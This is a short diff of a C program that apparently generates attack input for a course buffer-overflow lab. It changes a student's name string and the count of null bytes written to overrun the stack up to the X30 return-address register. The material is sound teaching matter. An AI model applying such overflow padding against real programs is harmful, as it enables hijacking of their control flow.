@@ -23,7 +23,7 @@ int main(void)
    char* psName;
    FILE *psFile;
    psFile = fopen("dataAplus", "w");
-   psName = "Sean Wang";
+   psName = "SeanW";
 
    /* Writes the student's name to the dataA file */
    for (i = 0; i<strlen(psName); i++){
@@ -53,7 +53,7 @@ int main(void)
 
    /* Writes enough null bytes to the dataB file
    to overrun until X30 */
-   for (i = 0; i<BUFSIZE-28; i++){
+   for (i = 0; i<BUFSIZE-24; i++){
        fprintf(psFile, "%c", 0x00);
    }
 
